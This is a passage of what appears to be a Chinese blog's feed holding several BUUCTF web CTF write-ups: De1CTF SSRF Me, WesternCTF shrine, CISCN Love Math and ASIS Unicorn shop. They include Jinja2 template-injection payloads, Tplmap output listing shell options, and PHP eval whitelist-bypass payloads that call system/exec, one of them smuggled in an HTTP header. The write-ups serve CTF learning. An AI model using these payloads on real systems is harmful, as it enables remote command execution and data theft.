class="comment">#返回MD5(key+param+action)</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(secert_key + param + action).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">md5</span>(<span class="params">content</span>):<span class="comment">#hash</span></span><br><span class="line">    <span class="keyword">return</span> hashlib.md5(content).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">waf</span>(<span class="params">param</span>):<span class="comment">#过滤关键字，无法使用伪协议</span></span><br><span class="line">    check=param.strip().lower()</span><br><span class="line">    <span class="keyword">if</span> check.startswith(<span class="string">&quot;gopher&quot;</span>) <span class="keyword">or</span> check.startswith(<span class="string">&quot;file&quot;</span>):     </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.debug = <span class="literal">False</span></span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure><h2 id="漏洞逻辑"><a href="#漏洞逻辑" class="headerlink" title="漏洞逻辑"></a>漏洞逻辑</h2><p>我们想如果我们想读取flag.txt（hint提示），我们如何设置？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">action=readscan<span class="comment">#因为判断是in，所以只要有read就可以，为什么不是scanread，后面会解释</span></span><br><span class="line">param=flag.txt</span><br><span class="line">sign=?</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>所以问题在于我们不知道sign，该sign&#x3D;MD5(key+’flag.txt’+’readscan’)，而我们看到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#generate Sign For Action Scan.</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/geneSign&quot;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>) </span><span class="comment">#这里学习到@app.route这种方式是相当于url定位引导，下面的函数就会直接运行了，很是奇怪，后面遇到大佬再询问询问。</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">geneSign</span>():<span class="comment">#生成默认的action，这里有逻辑漏洞</span></span><br><span class="line">    param = urllib.unquote(request.args.get(<span class="string">&quot;param&quot;</span>, <span class="string">&quot;&quot;</span>))</span><br><span class="line">    action = <span class="string">&quot;scan&quot;</span></span><br><span class="line">    <span class="keyword">return</span> getSign(action, param)</span><br></pre></td></tr></table></figure><p>访问&#x2F;geneSign会默认分配action&#x3D;scan，然后进入getSign，返回MD5(key+param+action)，也就是MD5(key+param+’scan’)</p><p>这是后我们就会发现我们缺的sign&#x3D;MD5(key+’flag.txt’+’readscan’)，与访问该文件获得的MD5(key+param+’scan’)，是可以相等的。</p><p>也就是我们可以访问&#x2F;geneSign，并构造param&#x3D;flag.txtread，通过MD5(key+’flag.txtread’+’scan’)，获得MD5(key+’flag.txt’+’readscan’)</p><p>这时候我们所缺的sign就搞定了，我们就可以正常读取flag.txt了</p><h3 id="第一步-获取sign"><a href="#第一步-获取sign" class="headerlink" title="第一步 获取sign"></a>第一步 获取sign</h3><p><img src="/2022/04/20/BUUCTF-WEB-De1CTF-2019-SSRF-Me-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2022-04-21-14-00-36.png"></p><h3 id="第二步-读取flag"><a href="#第二步-读取flag" class="headerlink" title="第二步 读取flag"></a>第二步 读取flag</h3><p><img src="/2022/04/20/BUUCTF-WEB-De1CTF-2019-SSRF-Me-SSRF-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/2022-04-21-14-01-08.png"></p><h2 id="还有一种法2，在下一篇讲解"><a href="#还有一种法2，在下一篇讲解" class="headerlink" title="还有一种法2，在下一篇讲解"></a>还有一种法2，在下一篇讲解</h2>]]></content>
      
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-WEB-[WesternCTF2018]shrine-模板注入-过滤圆括号\config\self</title>
      <link href="/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/"/>
      <url>/2022/04/20/BUUCTF-WEB-WesternCTF2018-shrine-%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5-%E8%BF%87%E6%BB%A4%E5%9C%86%E6%8B%AC%E5%8F%B7-config-self/</url>
      
        <content type="html"><![CDATA[<p>做题过程中，越来越感觉需要实际的开发经验才能够知其所以然。后期要多补补开发经验。</p><h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">格式</span><br><span class="line">url/shrine/&#123;&#123;tpl&#125;&#125;</span><br><span class="line"></span><br><span class="line">获取flag</span><br><span class="line">&#123;&#123;url_for.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config.FLAG&#125;&#125;</span><br><span class="line">&#123;&#123;get_flashed_messages.__globals__[<span class="string">&#x27;current_app&#x27;</span>].config.FLAG&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="tql使用"><a href="#tql使用" class="headerlink" title="tql使用"></a>tql使用</h2><p>很遗憾，这个注入没有参数，tpl需要魔改才可以，要注意tpl用的是py2</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$ ./tplmap.py -u <span class="string">&#x27;http://www.target.com/page?name=John&#x27;</span></span><br><span class="line">[+] Tplmap 0.5</span><br><span class="line">    Automatic Server-Side Template Injection Detection and Exploitation Tool</span><br><span class="line"></span><br><span class="line">[+] Testing <span class="keyword">if</span> GET parameter <span class="string">&#x27;name&#x27;</span> is injectable</span><br><span class="line">[+] Smarty plugin is testing rendering with tag <span class="string">&#x27;&#123;*&#125;&#x27;</span></span><br><span class="line">[+] Smarty plugin is testing blind injection</span><br><span class="line">[+] Mako plugin is testing rendering with tag <span class="string">&#x27;$&#123;*&#125;&#x27;</span></span><br><span class="line">...</span><br><span class="line">[+] Jinja2 plugin is testing rendering with tag <span class="string">&#x27;&#123;&#123;*&#125;&#125;&#x27;</span></span><br><span class="line">[+] Jinja2 plugin has confirmed injection with tag <span class="string">&#x27;&#123;&#123;*&#125;&#125;&#x27;</span></span><br><span class="line">[+] Tplmap identified the following injection point:</span><br><span class="line"></span><br><span class="line">  GET parameter: name</span><br><span class="line">  Engine: Jinja2</span><br><span class="line">  Injection: &#123;&#123;*&#125;&#125;</span><br><span class="line">  Context: text</span><br><span class="line">  OS: linux</span><br><span class="line">  Technique: render</span><br><span class="line">  Capabilities:</span><br><span class="line"></span><br><span class="line">   Shell <span class="built_in">command</span> execution: ok</span><br><span class="line">   Bind and reverse shell: ok</span><br><span class="line">   File write: ok</span><br><span class="line">   File <span class="built_in">read</span>: ok</span><br><span class="line">   Code evaluation: ok, python code</span><br><span class="line"></span><br><span class="line">[+] Rerun tplmap providing one of the following options:</span><br><span class="line"></span><br><span class="line">    --os-shell                Run shell on the target</span><br><span class="line">    --os-cmd                  Execute shell commands</span><br><span class="line">    --bind-shell PORT         Connect to a shell <span class="built_in">bind</span> to a target port</span><br><span class="line">    --reverse-shell HOST PORT Send a shell back to the attacker<span class="string">&#x27;s port</span></span><br><span class="line"><span class="string">    --upload LOCAL REMOTE     Upload files to the server</span></span><br><span class="line"><span class="string">    --download REMOTE LOCAL   Download remote files</span></span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://zhuanlan.zhihu.com/p/93746437">CTF|有关SSTI的一切小秘密【Flask SSTI+姿势集+Tplmap大杀器】</a> 非常好，推荐</p><p><a href="https://github.com/epinna/tplmap">https://github.com/epinna/tplmap</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-WEB-[CISCN 2019 初赛]Love Math-白名单绕过-eval</title>
      <link href="/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/"/>
      <url>/2022/04/19/BUUCTF-WEB-CISCN-2019-%E5%88%9D%E8%B5%9B-Love-Math-%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87-eval/</url>
      
        <content type="html"><![CDATA[<h2 id="基础分析"><a href="#基础分析" class="headerlink" title="基础分析"></a>基础分析</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];<span class="comment">//过滤了这些特殊字符</span></span><br><span class="line"><span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];<span class="comment">//白名单</span></span><br><span class="line"><span class="title function_ invoke__">preg_match_all</span>(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>); <span class="comment">//匹配使用的函数，基本原理是连续匹配字母和数字 </span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);<span class="comment">//直接拼接了_GET[&#x27;c&#x27;]，想着怎么利用呢</span></span><br></pre></td></tr></table></figure><h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><p><a href="https://www.jisuan.mobi/pb61bNub61uzmUJX.html">任意进制转换</a></p><h2 id="payload1"><a href="#payload1" class="headerlink" title="payload1"></a>payload1</h2><p>我们想，如果没有后面的白名单，我们怎么利用呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="title function_ invoke__">phpinfo</span>();<span class="variable">$a</span>=system;<span class="variable">$a</span>(<span class="variable">$_GET</span>[c]);</span><br><span class="line">?c=<span class="variable">$a</span>=_GET;<span class="variable">$$a</span>[b](<span class="variable">$$a</span>[c]);&amp;b=system&amp;c=ls;<span class="comment">//这里本地测试失败，必须将使用$x=$$a来过度，不明白为什么</span></span><br></pre></td></tr></table></figure><p>但是呢，特殊字符之间，我们只能用白名单里的数学函数，所以利用如下构造</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">构造_GET</span><br><span class="line"><span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));(<span class="variable">$$pi</span>&#123;abs&#125;)(<span class="variable">$$pi</span>&#123;acos&#125;)&amp;abs=system&amp;acos=ls</span><br><span class="line"><span class="comment">//base_convert(37907361743,10,36)是hex2bin，可以将hex转化为字符串</span></span><br><span class="line"><span class="comment">//dechex(1598506324) 是将_GET的十进制转化为hex，方便hex2bin使用</span></span><br><span class="line"><span class="comment">//base_convert直接转换成_GET，因为 &#x27;_&#x27;，在进制里面没有，只能用hex2bin配合转化</span></span><br><span class="line"><span class="variable">$pi</span>=<span class="title function_ invoke__">base_convert</span>(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">1598506324</span>));(<span class="variable">$$pi</span>&#123;abs&#125;)(<span class="variable">$$pi</span>&#123;acos&#125;)&amp;abs=system&amp;acos=cat /flag</span><br><span class="line"><span class="comment">//拿到flag</span></span><br></pre></td></tr></table></figure><p>怎么说呢，这里就是要对php这些函数套用比较熟练，然后多积累骚姿势。</p><h2 id="payload2"><a href="#payload2" class="headerlink" title="payload2"></a>payload2</h2><p>可以构造getallheaders()传参，此是小写的，可以直接用base_convert转换。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">构造:</span><br><span class="line"><span class="variable">$pi</span>=base_convert,<span class="variable">$pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()&#123;<span class="number">1</span>&#125;)</span><br><span class="line">分析：</span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt;<span class="string">&quot;exec&quot;</span></span><br><span class="line"><span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>) =&gt;<span class="string">&quot;getallheaders&quot;</span><span class="comment">//这里没有使用36进制原因是精度不够，我本地测试发现当字符串过长的时候，无法逆操作。这里可以用网站的返回判断</span></span><br><span class="line"><span class="title function_ invoke__">exec</span>(<span class="title function_ invoke__">getallheaders</span>()&#123;<span class="number">1</span>&#125;)</span><br></pre></td></tr></table></figure><p>在报文里添加 <code>1: cat /flag|base64</code>，以base64格式输出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">GET /?c=$pi=base_convert,$pi(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)($pi(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()%7B1%7D) HTTP/<span class="number">1.1</span></span><br><span class="line">Host: 49ba5ffb-d8e0-475f-a05d-568f87b6078e.node4.buuoj.cn:<span class="number">81</span></span><br><span class="line">User-Agent: Mozilla/<span class="number">5.0</span> (Windows NT <span class="number">10.0</span>; Win64; x64; rv:<span class="number">72.0</span>) Gecko/<span class="number">20100101</span> Firefox/<span class="number">72.0</span></span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=<span class="number">0.9</span>,image/webp,*/*;q=<span class="number">0.8</span></span><br><span class="line">Accept-Language: zh-CN,zh;q=<span class="number">0.8</span>,zh-TW;q=<span class="number">0.7</span>,zh-HK;q=<span class="number">0.5</span>,en-US;q=<span class="number">0.3</span>,en;q=<span class="number">0.2</span></span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Referer: http://49ba5ffb-d8e0-475f-a05d-568f87b6078e.node4.buuoj.cn:<span class="number">81</span>/?c=$pi=base_convert,$pi(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)($pi(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()%257B1%257D)</span><br><span class="line">Upgrade-Insecure-Requests: <span class="number">1</span></span><br><span class="line"><span class="number">1</span>:cat /flag|base64 </span><br></pre></td></tr></table></figure><h2 id="payload3"><a href="#payload3" class="headerlink" title="payload3"></a>payload3</h2><p>直接cat f*</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">bin2hex</span>(<span class="string">&#x27;cat f*&#x27;</span>));        <span class="comment">//得到109270211257898</span></span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;exec&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>);        <span class="comment">//得到696468</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//exec(&#x27;hex2bin(dechex(109270211257898))&#x27;) =&gt; exec(&#x27;cat f*&#x27;)</span></span><br><span class="line">(<span class="variable">$pi</span>=base_convert)(<span class="number">22950</span>,<span class="number">23</span>,<span class="number">34</span>)(<span class="variable">$pi</span>(<span class="number">76478043844</span>,<span class="number">9</span>,<span class="number">34</span>)(<span class="title function_ invoke__">dechex</span>(<span class="number">109270211257898</span>)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">dechex</span>(<span class="number">16</span>)^asinh^pi;        <span class="comment">//输出*</span></span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;cat&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>);        <span class="comment">//得到15941</span></span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="string">&#x27;system&#x27;</span>,<span class="number">36</span>,<span class="number">10</span>);        <span class="comment">//得到1751504350</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//system(&#x27;cat&#x27;.dechex(16)^asinh^pi) =&gt; system(&#x27;cat *&#x27;)</span></span><br><span class="line"><span class="title function_ invoke__">base_convert</span>(<span class="number">1751504350</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="title function_ invoke__">base_convert</span>(<span class="number">15941</span>,<span class="number">10</span>,<span class="number">36</span>).(<span class="title function_ invoke__">dechex</span>(<span class="number">16</span>)^asinh^pi))</span><br></pre></td></tr></table></figure><h2 id="payload4"><a href="#payload4" class="headerlink" title="payload4"></a>payload4</h2><p>利用异或拼接<br>异或脚本，这个可以重复使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span>=[<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">1</span>;<span class="variable">$k</span>&lt;=<span class="title function_ invoke__">sizeof</span>(<span class="variable">$payload</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span>=<span class="number">0</span>;<span class="variable">$j</span>&lt;=<span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$exp</span>=<span class="variable">$payload</span>[<span class="variable">$k</span>] ^<span class="variable">$i</span>.<span class="variable">$j</span>;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$payload</span>[<span class="variable">$k</span>].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span><span class="string">&quot;&lt;br /&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?c=<span class="variable">$pi</span>=(is_nan^(<span class="number">6</span>).(<span class="number">4</span>)).(tan^(<span class="number">1</span>).(<span class="number">5</span>));<span class="variable">$pi</span>=<span class="variable">$$pi</span>;<span class="variable">$pi</span>&#123;<span class="number">0</span>&#125;(<span class="variable">$pi</span>&#123;<span class="number">1</span>&#125;)&amp;<span class="number">0</span>=system&amp;<span class="number">1</span>=cat flag.php</span><br><span class="line"> </span><br><span class="line"><span class="comment">//$pi=_GET;$pi=$_GET;$_GET[0]($_GET[1])&amp;0=system&amp;1=cat flag.php     ==&gt; system(cat flag.php)</span></span><br><span class="line"><span class="comment">//这里也是用我的那个方式，用了pi作为过渡，之前那个为什么不用呢？需要php大佬来解答了</span></span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>php环境 下过滤的方式有很多，还需要慢慢积累，靠自己想真的有些难度。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://johnfrod.top/ctf/%E5%88%A9%E7%94%A8%E6%95%B0%E5%AD%A6%E5%87%BD%E6%95%B0%E6%9E%84%E9%80%A0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/">[CISCN 2019 初赛]Love Math</a><br><a href="https://www.jisuan.mobi/pb61bNub61uzmUJX.html">任意进制转换</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-WEB-[ASIS 2019]Unicorn shop-Unicode问题</title>
      <link href="/2022/04/19/BUUCTF-WEB-ASIS-2019-Unicorn-shop-Unicode%E9%97%AE%E9%A2%98/"/>
      <url>/2022/04/19/BUUCTF-WEB-ASIS-2019-Unicorn-shop-Unicode%E9%97%AE%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p>这个题还没有看太懂，暂时记录做题方法</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>传入UTF-8编码，在后端处理的过程中，发现该UTF-8编码无法解析为ASCII码，然后会将其解析为Unicode编码，而Unicode中的这个字符表示的值大于1337即可，且为一个字符，于是就绕过了一个字符的限制，数字大小也足够，成功购买，得到flag。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><p>在这个网站找一个大于1337的字符<br><a href="https://www.compart.com/en/unicode/U+1085F">https://www.compart.com/en/unicode/U+1085F</a></p><p>传入即可<br>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=4&amp;price=%25F0%2590%25A1%259F</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BUUCTF-WEB-[WUSTCTF2020]朴实无华-intval,md5,空格绕过</title>
      <link href="/2022/04/18/BUUCTF-WEB-WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E-intval-md5-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/"/>
      <url>/2022/04/18/BUUCTF-WEB-WUSTCTF2020-%E6%9C%B4%E5%AE%9E%E6%97%A0%E5%8D%8E-intval-md5-%E7%A9%BA%E6%A0%BC%E7%BB%95%E8%BF%87/</url>
      
